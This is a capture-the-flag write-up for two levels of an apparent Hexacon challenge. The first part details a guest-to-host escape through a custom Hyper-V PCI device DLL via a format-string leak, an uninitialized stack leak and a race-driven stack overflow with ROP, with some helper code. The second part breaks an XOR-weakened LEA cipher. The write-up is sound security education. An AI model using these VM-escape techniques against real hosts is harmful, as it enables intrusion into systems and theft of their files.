We can log into the server (`ssh -p 2221 root@518e3baefd2283e3cde6d0ce8bebec7a.fileshare.fr`) using the provided credentials, then download the provided files (`guest_installer.zip`, `host_installer.zip`, `mm_driver.c`), as well as `fbwrite` and `files_service` from `/etc/services`.

- `guest_installer.zip` contains only `empty.txt`, which says `Guest image already provisioned in host package.`
- `host_installer.zip` contains several files for a Windows machine:
    - `certmgr.exe`, `devcon.exe`: Microsoft-signed programs for assisting in driver installation
    - `host_pci_installer.{cer,inf,pdb,sys}`, `kmdfhost_pci_installer.cat`: A custom PCI driver which uses the Windows User-Mode Driver Framework to provide a "real" PCI device implemented by a program running in user mode.
    - [`pci_device.dll`](chall/level4/pci_device.dll): A user-mode "driver" that implements a PCI device
    - `install.bat`, `uninstall.bat`: Scripts to install/uninstall the various components.
    - `vm.vhdx`: Hyper-V disk image for the Linux VM.
- `fbwrite`: A simple program to put a message on the VM's screen, not useful for us
- [`files_service`](chall/level4/files_service): A program that interacts with the PCI device via the Linux `/sys` interface.

The Linux machine we've exploited is running as a Hyper-V VM on a Windows host. The Windows host exports a custom PCI device, which is registered as a "VM GPU Partition Adapter" and implemented by the user-mode `pci_device.dll` loaded into the `vmwp.exe` VM process. The intent of this PCI device is to provide an ostensibly secure way for the Linux guest to send files to the host to be stored safely.

The organizers were kind enough to provide a fully functional clone of the Windows host pre-configured with the VM installed and made accessible via RDP, which helped tremendously in developing the exploit.

### Reversing `pci_device.dll`

The `host_pci_installer` kernel component is relatively thin - it just forwards all the operations to the user-mode driver, and there's nothing obviously wrong with the code. So, our main target is the `pci_device.dll` driver. Thankfully, [a PDB](chall/level4/pci_device.pdb) was provided, which makes reversing a lot more pleasant.

`pci_device.dll` uses XFG (eXtended Flow Guard, a type of control flow integrity check) to protect certain indirect function calls in the code; since this makes Ghidra's output quite a bit worse, I patched all of the XFG calls into regular indirect calls:

```python
import struct

data = bytearray(open("pci_device.dll", "rb").read())
index = -1
while 1:
    index = data.find(b"\xff\x15", index + 1)
    if index == -1:
        break
    offset, = struct.unpack_from("<i", data, index + 2)
    if offset + index == 0xba892:
        print("patch at 0x%x" % index)
        data[index:index + 6] = b"\xff\xd0\x90\x90\x90\x90"

open("pci_device.noxfg.dll", "wb").write(data)
```

The main interface of this PCI device is the BAR0 memory space. Reads and writes to this space are handled by `Device::ReadInterceptedGpup` and `Device::WriteInterceptedGpup` respectively. A few fields in BAR7, the configuration space, are also handled.

The layout of BAR0 looks like this:

- 0x000: uint64 Signature, `'HEXACON'`
    - Valid values [1]: `'HEXACON'`
- 0x008: uint64 SignatureExt, `'PROD'`
    - Valid values [2]: `'PROD', 'DEVMODE'`
- 0x010: uint64 MonoStatus
    - Valid values [3]: `'GO!!', 'ABORT', 'PREPARE'`
- 0x018: uint32 MonoCrc
- 0x020: uint64 MonoGuestAddress
- 0x028: uint64 MonoGuestSize
- 0x030: uint32 NotUsed32B
    - Valid values [2]: `'HI', 'KIM'`
- 0x034: uint32 NotUsed32B2
- 0x120: char[80] DebugErrorMessage
- 0x200: uint64 MultiStatus
    - Valid values [3]: `'GO!!', 'ABORT', 'PREPARE'`
- 0x210: uint64 MultiGuestAddress
- 0x218: uint64 MultiGuestSize
- 0x500: char[6][80] DebugErrorMessageAsync

Writes to most fields are tightly controlled; only certain fields can be written, and the size and value of the fields will be checked in several cases. Writes to certain fields will initiate special functions within the driver. For example, by writing the value `'\0DEVMODE'` (0x4445564d4f4445) to offset 0x8 (`SignatureExt`), a debug flag (which I called `devmode`) will be toggled on, causing error messages to be written to offset 0x120 (`DebugErrorMessage`) and offset 0x500 (`DebugErrorMessageAsync`). If an invalid value is detected, an error message will be logged and the value will not be set.

Immediately, we can spot a bug in the driver: when an invalid value is written and devmode is enabled, `MMIOFields::WriteErrorValidateWrittenValueToGuest` is called to log the message in the `DebugErrorMessage`. It calls `MMIOFields::GetFieldFormatter` to get a format string corresponding to the written field, but for field 0x10 (`MonoStatus`), it inexplicably uses `%s` instead of `0x%llx` like the rest of the fields. This gives us a way to leak the host's memory (the memory of the `vmwp.exe` process) at any address by simply writing that address to `MonoStatus` and reading `DebugErrorMessage`. However, due to ASLR we do not yet have any valid addresses to leak.

Files are uploaded from the VM guest via two different protocols: "Mono" upload and "Multi" upload. `files_service` gives examples of both protocols. In Mono mode, the VM guest places the guest physical address, size and CRC32 of the file into `MonoCrc`, `MonoGuestAddress`, and `MonoGuestSize`, then triggers the file write by writing `PREPARE` and then `GO!!` to `MonoStatus`. In the PCI device, this spins up a thread running `MonoThread::Run`; the thread copies the file from the VM guest (by using `IVmGPUPGuestMemoryAccess->ReadRamBytes`), checks the CRC32, and then saves it to disk. If the CRC32 is wrong, the correct CRC32 will be copied back to the `MonoCrc` field and the file will not be written to disk.

In Multi mode, the VM guest places the guest physical address and size of a control block into `MultiGuestAddress` and `MultiGuestSize`. This control block consists of a 0x20-byte work header (`uint64_t num_items, num_threads;` and 16 bytes of padding), followed by `num_items` 0x20-byte work items (`uint64_t address, size; uint32_t crc32;`). The guest then writes `PREPARE` and `GO!!` to `MultiStatus`, which kicks off `MultiThread::run` in a separate thread. `MultiThread` memory-maps the control block into the host's memory space (using `IVmGPUPGuestMemoryAccess->CreateRamApertureFromByteRange`) then launches `num_threads` worker threads and distributes work items among them. The processing of each work item mirrors that of Mono mode: file data is copied from the VM guest address space, the CRC32 is checked, and then the file is written to disk if the CRC32 matches.

In both Multi and Mono modes, the file data will be copied to a stack buffer if the size is <= 0x400, otherwise the file data is copied to a freshly `new[]`'d block of memory. Notably, there's a bug here: the stack buffer is not zeroed, so if the copy fails (which can happen with an invalid guest address), the CRC32 will be computed on uninitialized stack memory, which will allow us to leak stack memory by reversing the CRC32.

Second, in Multi mode, there's a more significant bug: the control block is directly mapped from the guest physical memory, making it shared between the guest and the host. This means that, from the guest, we can change the contents of the control block *while the host is accessing it*, opening up the possibility of a race condition. Indeed, the stack buffer optimization turns out to be exploitable: if the file size in the work item is <= 0x400 when the host decides to use a stack buffer, but > 0x400 when the copy actually happens, the host will overflow the stack buffer with data from the guest!

### Exploiting `pci_device.dll`

We now have three bugs to exploit:

- Leak of stack memory via uninitialized stack buffer
- Leak of arbitrary memory via `MonoStatus` error message
- Stack buffer overflow by racing the work item size

I decided to implement my entire exploit in Python, which was installed in the guest. I used the `mmap` module in conjunction with `ctypes` to implement reads and writes of specific sizes (needed to interact with the PCI BAR0); I had to upload a copy of `libffi.so.6` in order to get `ctypes` to work. This gave me a nice REPL to interactively test things out and generally made exploit development quite pleasant.

The first bug can be exploited by creating 0x400 work items of sizes ranging from 1 byte to 0x400 bytes, all with invalid guest addresses so the copies fail. When each work item completes (and fails due to CRC32 mismatch), the worker will update the CRC32 value to be the checksum of the first N bytes of the uninitialized stack buffer. Thus, when all 0x400 work items complete, we can iterate through all possible bytes and pick the one that results in the "correct" CRC32 for each work item, and thereby reconstruct the entire stack buffer. This immediately gives us a lot of information: the stack buffer contains, among other things, a pointer to NTDLL, stack addresses, addresses to `pci_device.dll`, and heap addresses. We can then use our arbitrary memory leak to leak additional information, such as the stack canary and addresses of various useful structures and functions.

With the stack canary leaked and a stack buffer overflow, we can perform ROP inside the worker thread. Initially, I attempted to get shellcode execution (via `VirtualAlloc` + `VirtualProtect`), but I was stymied by Arbitrary Code Guard. The intended solution (as I found later) was to write a DLL using the write file functionality, then load it using `LoadLibrary`. However, I did not find this solution.

Instead, I implemented a "programmable ROP chain": I wrote an initial ropchain that pivoted the stack to the shared memory chunk, then wrote a second ropchain in the shared memory chunk that simply called `Thread::thread_sleep`, then popped the address of the start of the ropchain into RSP (thus looping `thread_sleep` endlessly). I could then call arbitrary functions by placing an appropriate ropchain elsewhere in the shared memory segment, then overwriting the ropchain's "loop" address to call the new ropchain. Luckily, all of the requisite gadgets can be found fairly easily in `pci_device.dll`. I guess you could call this an RPC mechanism - Ropchain Procedure Call.

Since the exploit is written in Python, I wrote some wrappers around `LoadLibrary` and the RPC mechanism, so by the end of the exploit, I could write code like this:

```
kernel32 = Library("kernel32.dll")

def host_ls(dn):
    dn = dn.rstrip("\\")
    find_data = bytearray(0x250)
    handle = kernel32.FindFirstFileW(dn, find_data)
    if handle == INVALID_HANDLE_VALUE:
        errno = kernel32.GetLastError()
        raise Exception(f"Failed to list directory {dn}: {errno:#x}")
    while 1:
        attributes, = struct.unpack_from("<I", find_data, 0)
        filesize_high, filesize_low = struct.unpack_from("<II", find_data, 0x1c)
        filesize = (filesize_high << 32) | filesize_low
        filename = find_data[0x2c:0x2c + 260*2].decode("utf-16-le").split("\0", 1)[0]
        print("%08x %12d %s%s" % (attributes, filesize, filename, "/" if (attributes & 0x10) else ""))
        res = kernel32.FindNextFileW(handle, find_data)
        if not res:
            break
    kernel32.FindClose(handle)
```

Finally, with all the pieces in place, we can start exploring the host's filesystem. All the goodies are found in the `C:\exploits` directory:

```
00000010            0 ./
00000016            0 ../
00000020           64 0day.py.enc
00000020      3618145 encrypt.exe
00000020           39 flag.txt
00000020          128 test.py.enc
00000020          127 test.py.raw~
```

I wrote a quick wrapper around `CreateFile` + `ReadFile` to copy these files. The full exploit can be found in [`exploit.py`](files/level4/exploit.py).

`flag.txt` contains the flag: `HXN{86b519eee1439add0dc5fc18d4c57815}`. Level 4 complete!

## Level 5: Breaking a Weak Cipher

We can guess that [`encrypt.exe`](chall/level5/encrypt.exe) was used to encrypt the exfiltrated zero-day `0day.py` as well as a test file `test.py`. Notably, we have the plaintext for `test.py` in [`test.py.raw~`](chall/level5/test.py.raw~), so we should be able to use this plaintext-ciphertext pair to break the encryption process.

`encrypt.exe` turns out to be a PyInstaller binary built with Python 3.7. I unpacked it with [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor), then decompiled the resulting `encrypt.pyc` file using [uncompyle6](https://pypi.org/project/uncompyle6/) to [`encrypt.py`](files/level5/encrypt.py):

```python
# uncompyle6 version 3.8.0
# Python bytecode 3.7.0 (3394)
# Decompiled from: Python 3.7.9 (v3.7.9:13c94747c7, Aug 15 2020, 01:31:08) 
# [Clang 6.0 (clang-600.0.57)]
# Embedded file name: encrypt.py
from datetime import date
from glob import glob
from os import remove

def bytes_to_words(b):
    return [int.from_bytes(b[i:i + 4], 'little') for i in range(0, len(b), 4)]


def words_to_bytes(w):
    return (b'').join([i.to_bytes(4, 'little') for i in w])


def rotate_left(x, n):
    return x << n & 4294967295 | x >> 32 - n & 4294967295


def rotate_right(x, n):
    return x << 32 - n & 4294967295 | x >> n & 4294967295


def pad(b):
    padding = 16 - len(b) % 16
    return b + padding * bytes([padding])


class LEA:

    def __init__(self, key):
        self.deltas = (3287280091, 1147300610, 2044886154, 2027892972, 1902027934,
                       3347438090, 3763270186, 3854829911)
        self.round_keys = self._key_schedule(key)

    def _key_schedule(self, key):
        round_keys = []
        state = bytes_to_words(key)
        for i in range(24):
            state[0] = rotate_left(state[0] ^ rotate_left(self.deltas[(i % 4)], i), 1)
            state[1] = rotate_left(state[1] ^ rotate_left(self.deltas[(i % 4)], i + 1), 3)
            state[2] = rotate_left(state[2] ^ rotate_left(self.deltas[(i % 4)], i + 2), 6)
            state[3] = rotate_left(state[3] ^ rotate_left(self.deltas[(i % 4)], i + 3), 11)
            round_keys.append((state[0], state[1], state[2], state[1], state[3], state[1]))

        return round_keys

    def _encrypt_block(self, block):
        state = bytes_to_words(block)
        for i in range(24):
            old_state = state[:]
            state[0] = rotate_left(old_state[0] ^ self.round_keys[i][0] ^ old_state[1] ^ self.round_keys[i][1], 9)
            state[1] = rotate_right(old_state[1] ^ self.round_keys[i][2] ^ old_state[2] ^ self.round_keys[i][3], 5)
            state[2] = rotate_right(old_state[2] ^ self.round_keys[i][4] ^ old_state[3] ^ self.round_keys[i][5], 3)
            state[3] = old_state[0]

        return words_to_bytes(state)

    def encrypt(self, plaintext):
        plaintext = pad(plaintext)
        ciphertext = b''
        for i in range(0, len(plaintext), 16):
            ciphertext += self._encrypt_block(plaintext[i:i + 16])

        return ciphertext


if __name__ == '__main__':
    if date.today() > date.fromisoformat('2022-04-01'):
        try:
            remove('C:\\key.txt')
        except:
            pass

    with open('C:\\key.txt', 'rb') as (f):
        key = f.read()
    lea = LEA(key)
    for path in glob('C:\\exploits\\*.raw'):
        with open(path, 'rb') as (f):
            content = f.read()
        enc = lea.encrypt(content)
        with open(path[:-3] + 'enc', 'wb') as (f):
            f.write(enc)
        remove(path)
```

This program encrypts every `*.raw` file in `C:\exploits` using the [LEA cipher](https://en.wikipedia.org/wiki/LEA_(cipher)) and a key file which is no longer accessible. Per Wikipedia, "as of 2019, no successful attack on full-round LEA is known", which does not bode well for us.

However, running this implementation against the test vectors on Wikipedia produces different results! Reading the implementation carefully, we can see that every modular addition operation (normal 32-bit `+`) has been replaced by an XOR in this implementation of LEA. This is an extremely severe weakening of the cipher: this implementation is fully bitwise linear! Normally, in an ARX cipher (add, rotate, xor) like LEA, the add and xor operations combine to produce nonlinearity.

Because this cipher is now linear, it's not any stronger than a keyed CRC, and can be broken by solving a linear equation over the bits. Indeed, my Gaussian elimination-based solver for linear equations over GF(2) ([`gf2.py`](https://github.com/nneonneo/pwn-stuff/blob/master/math/gf2.py))  quickly produces the cipher's key (in fact, there are multiple keys that work). The attack is implemented in [`recover_key.py`](files/level5/recover_key.py).

When we run the key recovery script, we get a key, `a55ae4444740007957c8d24aaf659cf4`, which we can use to decrypt `0day.py.enc` ([`decrypt_0day.py`](files/level5/decrypt_0day.py)) and obtain the final flag: `HXN{1355239c59f759bd56e13b3432a9b49c}`. Challenge complete!

## Conclusion

This was great fun, and I had a blast solving the challenges. I particularly learned a lot about Windows pwn in the process. I am particularly excited to get the opportunity to attend Hexacon and meet folks in the offensive security space!
